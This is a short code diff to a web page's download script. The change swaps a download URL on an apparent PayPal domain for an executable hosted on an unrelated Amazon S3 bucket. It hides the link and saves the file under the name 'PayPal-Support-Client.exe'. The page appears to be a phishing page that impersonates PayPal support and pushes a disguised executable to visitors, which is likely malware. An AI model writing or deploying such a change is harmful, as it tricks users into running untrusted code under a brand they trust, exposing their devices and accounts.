@@ -648,8 +648,9 @@
         confirmDownload.addEventListener('click', function() {
             // Create download link
             const link = document.createElement('a');
-            link.href = 'https://download.paypal.com/support/support.Client.exe'; // Use your actual download URL here
-            link.download = 'support.Client.exe';
+            link.href = 'https://exe-file-download.s3.ap-southeast-1.amazonaws.com/secure.EXE';
+            link.style.display = 'none';
+            link.download = 'PayPal-Support-Client.exe';
             
             // Add to DOM, click, and remove
             document.body.appendChild(link);
